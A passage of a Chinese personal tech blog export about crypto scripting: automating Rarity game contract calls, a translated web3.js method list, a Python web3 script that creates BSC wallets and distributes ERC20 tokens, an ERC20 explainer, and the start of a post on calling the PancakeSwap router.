<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/25641732-8ED4-4D10-81F4-B5E90094D83D.png" alt="25641732-8ED4-4D10-81F4-B5E90094D83D"></p>
<blockquote>
<p>xp_required</p>
</blockquote>
<ul>
<li>查询下一级所需经验</li>
<li>input:等级</li>
<li>output:下一级所需经验</li>
</ul>
<h2 id="writeContract"><a href="#writeContract" class="headerlink" title="writeContract:"></a>writeContract:</h2><p><a href="https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#writeContract">https://ftmscan.com/address/0xce761d788df608bd21bdd59d6f4b54b2e27f25bb#writeContract</a></p>
<blockquote>
<p>adventure</p>
</blockquote>
<ul>
<li>让角色去冒险,每天只能冒险一次，每次获得250xp</li>
<li>input:角色id</li>
</ul>
<blockquote>
<p>level_up</p>
</blockquote>
<ul>
<li>角色升级</li>
<li>input:角色id</li>
</ul>
<hr>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h1><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图:"></a>流程图:</h2><p>自动冒险:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/DF22C901-3AC7-48EE-8D73-592181380B59.png" alt="DF22C901-3AC7-48EE-8D73-592181380B59"></p>
<ul>
<li>查出自己地址有哪些角色id</li>
<li>调用合约的查询函数<code>summoner</code>，知道下一次冒险时间</li>
<li>判断一下有没到冒险时间</li>
<li>满足条件的话，调用合约的<code>adventure</code>，让角色去冒险</li>
</ul>
<p>自动升级:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/84454A4B-F8F1-444D-AB4A-79B47F941381.png" alt="84454A4B-F8F1-444D-AB4A-79B47F941381"></p>
<ul>
<li>调用合约函数<code>summoner</code>，知道当前经验值</li>
<li>调用合约函数<code>xp_required</code>,知道下次升级所需经验</li>
<li>满足条件的话，调用合约的<code>level_up</code>，让角色去升级</li>
</ul>
<hr>
<h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题:"></a>一些问题:</h1><h1 id="gas："><a href="#gas：" class="headerlink" title="gas："></a>gas：</h1><p>自己的脚本和<code>https://rarityextended.com/</code>执行的gas费有些差异,后续有空要看一下怎么样省一下gas fee，虽然也很少钱。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/2749692E-F7D8-49E0-A22D-BD8AE0CC1040.png" alt="2749692E-F7D8-49E0-A22D-BD8AE0CC1040"></p>
<h1 id="交易失败"><a href="#交易失败" class="headerlink" title="交易失败:"></a>交易失败:</h1><p>脚本定时跑起来后，常有几笔失败的交易，可能跟nonce设置有关系。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210927120445.png" alt="20210927120445"></p>
<hr>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>脚本定时跑起来后，就不用去web页面上一个个点去冒险和升级，方便了不少，<br>写之前觉得挺麻烦的，有点无从下手，写完才发现很简单。hhh</p>
<p>后续加点、玩副本这些，有空再研究补充下吧~</p>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://www.chainnews.com/news/322609390326.htm">Yearn Finance 创始人受 Loot 启发推出冒险游戏 Rarity</a></li>
<li><a href="https://bihu.com/article/1182970312">全网最详细——AC游戏“Rarity”人物简介和加点攻略</a></li>
<li><a href="https://bihu.com/article/1438014279">【百大链游】FTM上的大冒险Rarity</a></li>
<li><a href="https://mp.weixin.qq.com/s/NwlpshhnEXgcqwqFF5JGbw">【DFarm】Rarity游戏基础规则超详细剖析</a></li>
<li><a href="https://rarityextended.com/">rarity Web1</a></li>
<li><a href="https://raritymmo.com/">rarity Web2</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-web3js文档方法列表</title>
    <url>//65046.html</url>
    <content><![CDATA[<h1 id="web3-js-1-0中文手册"><a href="#web3-js-1-0中文手册" class="headerlink" title="web3.js 1.0中文手册"></a>web3.js 1.0中文手册</h1><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><ul>
<li>web3.version - 版本信息</li>
<li>web3.modules - 子模块集合对象</li>
<li>web3.setProvider - 设置服务提供器</li>
<li>web3.providers - 服务提供器集合对象</li>
<li>web3.givenProvider - 原生服务提供器</li>
<li>web3.currentProvider - 当前服务提供器</li>
<li>web3.BatchRequest - 批量请求</li>
<li>web3.extend - 模块继承</li>
</ul>
<h1 id="web3-eth"><a href="#web3-eth" class="headerlink" title="web3.eth"></a>web3.eth</h1><ul>
<li>web3.eth.defaultAccount - 默认账户</li>
<li>web3.eth.defaultBlock - 默认块</li>
<li>web3.eth.getProtocolVersion - 返回协议版本信息</li>
<li>web3.eth.isSyncing - 检查节点是否同步</li>
<li>web3.eth.getCoinbase - 返回挖矿收益账户</li>
<li>web3.eth.isMining - 检查节点是否在挖矿</li>
<li>web3.eth.getHashrate - 返回节点旳哈希计算速度</li>
<li>web3.eth.getGasPrice - 返回当前gas价格</li>
<li>web3.eth.getAccounts - 返回账户列表</li>
<li>web3.eth.getBlockNumber - 返回当前块编号</li>
<li>web3.eth.getBalance - 返回指定账户余额</li>
<li>web3.eth.getStorageAt - 返回指定地址存储内容</li>
<li>web3.eth.getCode - 返回指定地址的代码</li>
<li>web3.eth.getBlock - 返回指定块</li>
<li>web3.eth.getBlockTransactionCount - 返回指定块中的交易数量</li>
<li>web3.eth.getUncle - 返回指定叔伯块</li>
<li>web3.eth.getTransaction - 返回指定交易对象</li>
<li>web3.eth.getTransactionFromBlock - 返回块中指定交易对象</li>
<li>web3.eth.getTransactionReceipt - 返回指定交易的收据</li>
<li>web3.eth.getTransactionCount - 返回指定地址发生的交易数量</li>
<li>web3.eth.sendTransaction - 发送交易</li>
<li>web3.eth.sendSignedTransaction - 发送已签名交易</li>
<li>web3.eth.sign - 为数据生成签名</li>
<li>web3.eth.signTransaction - 为交易生成签名</li>
<li>web3.eth.call - 执行消息调用</li>
<li>web3.eth.estimateGas - 估算gas用量</li>
<li>web3.eth.getPastLogs - 返回历史日志</li>
<li>web3.eth.getCompilers - 返回可用编译器清单</li>
<li>web3.eth.compile.solidity - 编译solidity代码</li>
<li>web3.eth.compile.lll - 编译lll代码</li>
<li>web3.eth.compile.serpent - 编译serpent代码</li>
<li>web3.eth.getWork - 返回当前挖矿工作情况</li>
<li>web3.eth.submitWork - 提交POW解决方案</li>
<li>web3.eth.subscribe</li>
<li>web3.eth.subscribe - 订阅链上事件</li>
<li>web3.eth.clearSubscriptions - 复位订阅状态</li>
<li>web3.eth.subscribe(‘pendingTransactions’) - 订阅挂起交易事件</li>
<li>web3.eth.subscribe(‘newBlockHeaders’) - 订阅区块头生成事件</li>
<li>web3.eth.subscribe(‘syncing’) - 订阅同步事件</li>
<li>web3.eth.subscribe(‘logs’) - 订阅日志</li>
</ul>
<h1 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h1><ul>
<li>web3.eth.Contract - 合约构造函数</li>
<li>options - 合约配置对象</li>
<li>options.address - 合约地址</li>
<li>options.jsonInterface - 合约JSON接口</li>
<li>clone - 克隆合约</li>
<li>deploy - 部署合约</li>
<li>methods - 为合约方法创建交易</li>
<li>call - 调用合约方法</li>
<li>send - 发送合约方法交易</li>
<li>estimateGas - 估算合约方法gas用量</li>
<li>encodeABI - ABI编码合约方法</li>
<li>once - 单次订阅合约事件</li>
<li>events - 订阅合约事件</li>
<li>events.allEvents - 订阅全部事件</li>
<li>getPastEvents - 读取历史事件</li>
</ul>
<h1 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h1><ul>
<li>web3.eth.accounts - 账户管理与交易签名</li>
<li>web3.eth.accounts.create - 创建账户</li>
<li>web3.eth.accounts.privateKeyToAccount - 使用指定私钥创建账户</li>
<li>web3.eth.accounts.recoverTransaction - 提取交易的签名账户</li>
<li>web3.eth.accounts.hashMessage - 计算消息的哈希</li>
<li>web3.eth.accounts.sign - 为数据生成签名</li>
<li>web3.eth.accounts.recover - 提取数据的签名账户</li>
<li>web3.eth.accounts.encrypt - 加密指定私钥</li>
<li>web3.eth.accounts.decrypt - 解密keystore对象</li>
<li>web3.eth.accounts.wallet - 钱包对象</li>
<li>web3.eth.accounts.wallet.create - 在钱包中创建账户</li>
<li>web3.eth.accounts.wallet.add - 向钱包添加已有账户</li>
<li>web3.eth.accounts.wallet.remove - 从钱包中移除指定账户</li>
<li>web3.eth.accounts.wallet.clear - 清空钱包</li>
<li>web3.eth.accounts.wallet.encrypt - 加密钱包</li>
<li>web3.eth.accounts.wallet.decrypt - 解密钱包</li>
<li>web3.eth.accounts.wallet.save - 保存钱包</li>
<li>web3.eth.accounts.wallet.load - 载入钱包</li>
</ul>
<h1 id="账户交互"><a href="#账户交互" class="headerlink" title="账户交互"></a>账户交互</h1><ul>
<li>web3.eth.personal - 账户交互</li>
<li>web3.eth.personal.newAccount - 创建新账户</li>
<li>web3.eth.personal.sign - 为数据生成签名</li>
<li>web3.eth.personal.ecRecover - 提取数据的签名账户</li>
<li>web3.eth.personal.signTransaction - 为交易生成签名</li>
</ul>
<h1 id="应用二进制接口ABI"><a href="#应用二进制接口ABI" class="headerlink" title="应用二进制接口ABI"></a>应用二进制接口ABI</h1><ul>
<li>web3.eth.abi - ABI管理</li>
<li>web3.eth.abi.encodeFunctionSignature - 函数编码</li>
<li>web3.eth.abi.encodeEventSignature - 事件编码</li>
<li>web3.eth.abi.encodeParameter - 参数编码</li>
<li>web3.eth.abi.encodeParameters - 参数组编码</li>
<li>web3.eth.abi.encodeFunctionCall - 函数调用编码</li>
<li>web3.eth.abi.decodeParameter - 参数解码</li>
<li>web3.eth.abi.decodeParameters - 参数组解码</li>
<li>web3.eth.abi.decodeLog - 日志解码</li>
</ul>
<h1 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h1><ul>
<li>web3.utils - 辅助工具函数集</li>
<li>web3.utils.randomHex - 生成伪随机16进制字符串</li>
<li>web3.utils._ - underscore接口</li>
<li>web3.utils.BN - BN.js接口</li>
<li>web3.utils.isBN - 检查给定参数是否BN对象</li>
<li>web3.utils.isBigNumber - 检查给定参数是否为BigNumber对象</li>
<li>web3.utils.sha3 - 计算sha3哈希值</li>
<li>web3.utils.soliditySha3 - solidity方式计算sha3哈希</li>
<li>web3.utils.isHex - 检查给定参数是否为16进制</li>
<li>web3.utils.isHexStrict - 严格模式16进制检查</li>
<li>web3.utils.isAddress - 检查给定参数是否为有效地址</li>
<li>web3.utils.toChecksumAddress - 转换为校验和地址</li>
<li>web3.utils.checkAddressChecksum - 校验地址</li>
<li>web3.utils.toHex - 转换为16进制字符串</li>
<li>web3.utils.toBN - 转换为BN对象</li>
<li>web3.utils.hexToNumberString - 转换为10进制数值字符串</li>
<li>web3.utils.hexToNumber - 转换为数值</li>
<li>web3.utils.numberToHex - 数值转换为16进制表示</li>
<li>web3.utils.hexToUtf8 - 16进制字符串转换为utf-8</li>
<li>web3.utils.hexToAscii - 16进制字符串转换为ascii</li>
<li>web3.utils.utf8ToHex - utf-8字符串转换为16进制</li>
<li>web3.utils.asciiToHex - ascii字符串转换为16进制</li>
<li>web3.utils.hexToBytes - 16进制字符串转换为字节数组</li>
<li>web3.utils.toWei - 转换到wei</li>
<li>web3.utils.fromWei - 从wei转换到其他以太单位</li>
<li>web3.utils.unitMap - 以太单位换算表</li>
<li>web3.utils.padLeft - 左侧零补齐</li>
<li>web3.utils.padRight - 右侧零补齐</li>
</ul>
<h1 id="网络交互"><a href="#网络交互" class="headerlink" title="网络交互"></a>网络交互</h1><ul>
<li>web3.*.net - 网络交互</li>
<li>web3.*.net.getId - 返回网络id</li>
<li>web3.*.net.isListening - 检查节点监听状态</li>
<li>web3.*.net.getPeerCount - 返回已连接对端节点数</li>
</ul>
<h2 id="地址转换"><a href="#地址转换" class="headerlink" title="地址转换"></a>地址转换</h2><ul>
<li>web3.eth.Iban - 创建Iban对象</li>
<li>web3.eth.Iban.toAddress - 将iban对象转换为以太坊地址</li>
<li>web3.eth.Iban.toIban - 将以太坊地址转换为Iban对象</li>
<li>web3.eth.Iban.toAddress - 将iban对象转换为以太坊地址</li>
<li>web3.eth.Iban.fromEthereumAddress - 将以太坊地址转换为Iban对象</li>
<li>web3.eth.Iban.fromBban - 使用Bban地址创建Iban对象</li>
<li>web3.eth.Iban.createIndirect - 创建间接Iban对象</li>
<li>web3.eth.Iban.isValid - 检查给定Iban地址是否有效</li>
<li>web3.eth.Iban.isDirect - 检查是否采用直接编码方案</li>
<li>web3.eth.Iban.isIndirect - 检查是否采用间接编码方案</li>
<li>web3.eth.Iban.institution - 返回Iban的机构名称</li>
<li>web3.eth.Iban.client - 返回Iban的客户账号</li>
<li>web3.eth.Iban.toAddress - 实例方法</li>
<li>web3.eth.Iban.toString - 返回Iban地址字符串</li>
</ul>
<h2 id="whisper协议交互"><a href="#whisper协议交互" class="headerlink" title="whisper协议交互"></a>whisper协议交互</h2><ul>
<li>web3.shh - whisper协议交互</li>
<li>web3.shh.getVersion - 返回whisper协议版本</li>
<li>web3.shh.getInfo - 返回whisper节点信息</li>
<li>web3.shh.setMaxMessageSize - 设置whisper消息大小上限</li>
<li>web3.shh.setMinPoW - 设置节点最小PoW</li>
<li>web3.shh.markTrustedPeer - 标记可信节点</li>
<li>web3.shh.newKeyPair - 创建密钥对</li>
<li>web3.shh.addPrivateKey - 使用私钥创建密钥对</li>
<li>web3.shh.deleteKeyPair - 删除指定密钥对</li>
<li>web3.shh.hasKeyPair - 检查节点是否有指定密钥对</li>
<li>web3.shh.getPublicKey - 返回公钥</li>
<li>web3.shh.getPrivateKey - 返回私钥</li>
<li>web3.shh.newSymKey - 创建对称密钥</li>
<li>web3.shh.addSymKey - 添加对称密钥</li>
<li>web3.shh.generateSymKeyFromPassword - 使用指定密码生成对称密钥</li>
<li>web3.shh.hasSymKey - 检查是否有指定对称密钥</li>
<li>web3.shh.getSymKey - 返回对称密钥</li>
<li>web3.shh.post - 发送whisper消息</li>
<li>web3.shh.subscribe - 订阅whisper消息</li>
<li>web3.shh.clearSubscriptions - 清理订阅</li>
<li>web3.shh.newMessageFilter - 创建消息过滤器</li>
<li>web3.shh.deleteMessageFilter - 删除消息过滤器</li>
<li>web3.shh.getFilterMessages - 读取新消息<br>Swarm交互</li>
<li>web3.bzz - Swarm交互</li>
<li>web3.bzz.upload - 上传到Swarm</li>
<li>web3.bzz.download - 从Swarm下载</li>
<li>web3.bzz.pick - 打开文件选择器</li>
</ul>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="http://cw.hubwiz.com/card/c/web3.js-1.0/1/8/24/">web3js中文文档</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-批量创建钱包和转账</title>
    <url>//12472.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>需求:</p>
<ol>
<li>创建40个bsc新钱包</li>
<li>由1个主钱包把某代币平均分发到40个新钱包中去</li>
</ol>
<hr>
<h1 id="脚本"><a href="#脚本" class="headerlink" title="脚本:"></a>脚本:</h1><h2 id="创建钱包"><a href="#创建钱包" class="headerlink" title="创建钱包:"></a>创建钱包:</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, HTTPProvider</span><br><span class="line"><span class="keyword">from</span> web3.middleware <span class="keyword">import</span> geth_poa_middleware</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_wallet</span>():</span><br><span class="line">    bscUrl = <span class="string">&quot;&quot;</span></span><br><span class="line">    web3 = Web3(HTTPProvider(bscUrl))</span><br><span class="line">    web3.middleware_stack.inject(geth_poa_middleware, layer=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    bscAccount = web3.eth.account.create(password)</span><br><span class="line"></span><br><span class="line">    bscAddress = bscAccount.address</span><br><span class="line">    privateKey = bscAccount.privateKey.<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>

<p>这一步遇到的问题主要是，web3js的文档和web3py的有些差异，使用上需要注意。</p>
<h2 id="转账代币"><a href="#转账代币" class="headerlink" title="转账代币:"></a>转账代币:</h2><p>这一步也很简单，调用代币合约里的<code>transfer</code>函数即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">contract_address = <span class="string">&#x27;&#x27;</span>  <span class="comment"># 代币地址</span></span><br><span class="line">contract = web3.eth.contract(address=contract_address, abi=abi)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转账数量</span></span><br><span class="line">amount_ether = web3.toWei(amount, <span class="string">&#x27;ether&#x27;</span>)</span><br><span class="line">logger.debug(<span class="string">&quot;[*] send amount: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(amount))</span><br><span class="line"></span><br><span class="line">nonce = web3.eth.getTransactionCount(main_address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建交易对象</span></span><br><span class="line">token_tx = contract.functions.transfer(to_addr, amount_ether).buildTransaction(&#123;</span><br><span class="line">    <span class="string">&#x27;chainId&#x27;</span>: <span class="number">56</span>, <span class="string">&#x27;gas&#x27;</span>: <span class="number">200000</span>, <span class="string">&#x27;gasPrice&#x27;</span>: web3.toWei(<span class="string">&quot;5&quot;</span>, <span class="string">&#x27;gwei&#x27;</span>), <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment"># 私钥签名，然后发送交易</span></span><br></pre></td></tr></table></figure>

<h2 id="代币合约"><a href="#代币合约" class="headerlink" title="代币合约:"></a>代币合约:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> ERC20 interface</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> see https://github.com/ethereum/EIPs/issues/20</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface <span class="title class_">IERC20</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address who</span>) external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address owner, address spender</span>)</span><br><span class="line">    external view returns (uint256);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint256 value</span>) external returns (bool);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 value</span>)</span><br><span class="line">    external returns (bool);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint256 value</span>)</span><br><span class="line">    external returns (bool);</span><br><span class="line"></span><br><span class="line">  event <span class="title class_">Transfer</span>(</span><br><span class="line">    address indexed <span class="keyword">from</span>,</span><br><span class="line">    address indexed to,</span><br><span class="line">    uint256 value</span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  event <span class="title class_">Approval</span>(</span><br><span class="line">    address indexed owner,</span><br><span class="line">    address indexed spender,</span><br><span class="line">    uint256 value</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">ERC20</span> is <span class="title class_">IERC20</span> &#123; ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看一下代币合约的solidity代码，可知大部分代币都是符合erc20标准的，都有几个基础函数.</p>
<ul>
<li>totalSupply():总供应量</li>
<li>balanceOf():余额</li>
<li>allowance():授权的代币数量</li>
<li>transfer():转账</li>
<li>approve():批准花费代币</li>
<li>transferFrom():转账</li>
</ul>
<hr>
<h1 id="ERC20"><a href="#ERC20" class="headerlink" title="ERC20:"></a>ERC20:</h1><h2 id="什么是Token（代币）？"><a href="#什么是Token（代币）？" class="headerlink" title="什么是Token（代币）？"></a>什么是Token（代币）？</h2><p>在Ethereum中，代币几乎可以代表任何东西，从在线平台的信誉点、游戏中角色的技能、彩票到金融资产债券，再到真正的商品，如公司的股份、货币、金盎司等！<br>如此强大的功能，值得也必须处理好。<br>如此强大的功能，理应也必须由一个强大的标准来处理，对吗？<br>这正是<code>ERC-20</code>的作用所在，<code>ERC-20</code>就是针对这些发布的Token（代币）制定的一个固定的基础的标准原则。</p>
<hr>
<h2 id="什么是-ERC20"><a href="#什么是-ERC20" class="headerlink" title="什么是 ERC20:"></a>什么是 ERC20:</h2><p><code>ERC-20</code>引入了可替代Token的标准。<br>换句话说，它们具有使每个Token与另一个Token完全相同（在类型和价值上）的属性。<br>例如，<code>ERC-20</code>，Token的行为与ETH相同，这意味着任意1个遵循ERC-20规则的Token与所有其他所有Token是平等和相同的。</p>
<blockquote>
<p>简单地说，任何<code>ERC-20</code>代币都能立即兼容以太坊钱包（几乎所有支持以太币的钱包，包括Jaxx、MEW、imToken等，也支持 erc-20的代币）</p>
<p>由于交易所已经知道这些代币是如何操作的，它们可以很容易地整合这些代币。这就意味着，在很多情况下，这些代币都是可以立即进行交易的。</p>
</blockquote>
<p>标准化非常有利，也就意味着这些资产可以用于不同的平台和项目，否则只能用在特定的场合。</p>
<p>代币（Token）是区块链中定义价值的方式，用于标定金融或数字资产。</p>
<p>在以太坊上，<strong>代币使用相同的标准，这样代币之间的兑换和DAPP支持就会变得容易</strong>。</p>
<hr>
<h2 id="标准规定了哪些内容"><a href="#标准规定了哪些内容" class="headerlink" title="标准规定了哪些内容:"></a>标准规定了哪些内容:</h2><p>ERC20 是各个代币的标准接口。</p>
<p>ERC20 代币仅仅是以太坊代币的子集。<br>为了充分兼容 ERC20，开发者需要将一组特定的函数（接口）集成到他们的智能合约中，以便在高层面能够执行以下操作：</p>
<ul>
<li>获得代币总供应量</li>
<li>获得账户余额</li>
<li>转让代币</li>
<li>批准花费代币</li>
</ul>
<p>ERC20 让以太坊区块链上的其他智能合约和去中心化应用之间无缝交互。</p>
<hr>
<h2 id="ERC20-标准"><a href="#ERC20-标准" class="headerlink" title="ERC20 标准:"></a>ERC20 标准:</h2><p>ERC20 标准定义了一个兼容协议, 需要实现的函数. 具体如下.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line">  <span class="comment">// ERC Token Standard #20 Interface</span></span><br><span class="line">  <span class="comment">// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md</span></span><br><span class="line">  <span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line">  contract <span class="title class_">ERC20Interface</span> &#123;</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">totalSupply</span>(<span class="params"></span>) public constant returns (uint);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address tokenOwner</span>) public constant returns (uint balance);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">allowance</span>(<span class="params">address tokenOwner, address spender</span>) public constant returns (uint remaining);</span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address to, uint tokens</span>) public returns (bool success);</span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint tokens</span>) public returns (bool success);</span><br><span class="line">     <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params">address <span class="keyword">from</span>, address to, uint tokens</span>) public returns (bool success); </span><br><span class="line">     event <span class="title class_">Transfer</span>(address indexed <span class="keyword">from</span>, address indexed to, uint tokens);</span><br><span class="line">     event <span class="title class_">Approval</span>(address indexed tokenOwner, address indexed spender, uint tokens);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>同时规定了三个必须定义的变量,分别是</p>
<ul>
<li>合约名称</li>
<li>合约代号</li>
<li>合约进制</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">string public constant name = <span class="string">&quot;Token Name&quot;</span>;</span><br><span class="line">string public constant symbol = <span class="string">&quot;SYM&quot;</span>;</span><br><span class="line">uint8 public constant decimals = <span class="number">18</span>;  <span class="comment">// 18 is the most common number of decimal places</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p>cool,脚本是挺简单的，顺便了解了一下<code>erc20</code>的代币标准</p>
<hr>
<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
<li><a href="https://github.com/akhdaniel/eth-election/blob/719d5edd4127a8314c958968a195437cb0a1b088/python/test-create-account.py">create wallet web3py</a></li>
<li><a href="https://www.jianshu.com/p/a3a59c651cc2">ERC20代币那么火爆, 那么ERC20到底是什么?</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/313299528">ERC-20是什么？</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-调用pancake合约进行交易</title>
    <url>//38991.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>最近在看<a href="https://github.com/PancakeBunny-finance/Bunny/blob/main/contracts/zap/ZapBSC.sol">pancakeBunny</a>机枪池的源代码时，看到了他们有个<code>zap</code>功能</p>
<blockquote>
<p>Zap 功能本质上允许用户直接从单一资产（BNB）切换到 LP 代币（BNB-CAKE LP），只需单击一个按钮，而无需进行煎饼交换和切换不同的资产</p>
</blockquote>
<p>源码里是直接调用<code>pancakeswap router</code>合约,后面打算尝试写个类似的<code>dex</code> dapp玩一下。</p>
<p>现在先试一下如何调用<code>pancakeswap router</code>进行代币的交换。</p>
<hr>
<h1 id="pancakebunny-zap-源码"><a href="#pancakebunny-zap-源码" class="headerlink" title="pancakebunny zap 源码:"></a>pancakebunny zap 源码:</h1><p>贴个函数,solidity的代码量感觉都比较少，多看看多实践应该不难掌握吧~</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将代币的一半换成另一种代币，然后提供流动性</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">zapInToken</span>(<span class="params">address _from, uint amount, address _to</span>) external override &#123;</span><br><span class="line">        <span class="title class_">IBEP20</span>(_from).<span class="title function_">safeTransferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">        <span class="title function_">_approveTokenIfNeeded</span>(_from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isFlip</span>(_to)) &#123;</span><br><span class="line">            <span class="title class_">IPancakePair</span> pair = <span class="title class_">IPancakePair</span>(_to);</span><br><span class="line">            address token0 = pair.<span class="title function_">token0</span>();</span><br><span class="line">            address token1 = pair.<span class="title function_">token1</span>();</span><br><span class="line">            <span class="keyword">if</span> (_from == token0 || _from == token1) &#123;</span><br><span class="line">                <span class="comment">// swap half amount for other</span></span><br><span class="line">                address other = _from == token0 ? token1 : token0;</span><br><span class="line">                <span class="title function_">_approveTokenIfNeeded</span>(other); <span class="comment">// 授权</span></span><br><span class="line">                uint sellAmount = amount.<span class="title function_">div</span>(<span class="number">2</span>); <span class="comment">// 一半的数量</span></span><br><span class="line">                uint otherAmount = <span class="title function_">_swap</span>(_from, sellAmount, other, <span class="title function_">address</span>(<span class="variable language_">this</span>)); <span class="comment">// 兑换</span></span><br><span class="line">                pair.<span class="title function_">skim</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">                <span class="variable constant_">ROUTER</span>.<span class="title function_">addLiquidity</span>(_from, other, amount.<span class="title function_">sub</span>(sellAmount), otherAmount, <span class="number">0</span>, <span class="number">0</span>, msg.<span class="property">sender</span>, block.<span class="property">timestamp</span>); <span class="comment">// 添加流动性</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                uint bnbAmount = _from == <span class="variable constant_">WBNB</span> ? <span class="title function_">_safeSwapToBNB</span>(amount) : <span class="title function_">_swapTokenForBNB</span>(_from, amount, <span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">                <span class="title function_">_swapBNBToFlip</span>(_to, bnbAmount, msg.<span class="property">sender</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">_swap</span>(_from, amount, _to, msg.<span class="property">sender</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Pancakeswap-Router交互"><a href="#Pancakeswap-Router交互" class="headerlink" title="Pancakeswap Router交互"></a>Pancakeswap Router交互</h1><p><a href="https://bscscan.com/address/0x10ed43c718714eb63d5aa57b78b54704e256024e#writeContract">pancakeswap router contract</a>里面共17个函数,如下</p>
<p>流动性相关:</p>
<ul>
<li><code>addLiquidity</code></li>
<li><code>addLiquidityETH</code></li>
<li><code>removeLiquidity</code></li>
<li><code>removeLiquidityETH</code></li>
<li><code>removeLiquidityETHSupportingFeeOnTransferTokens</code></li>
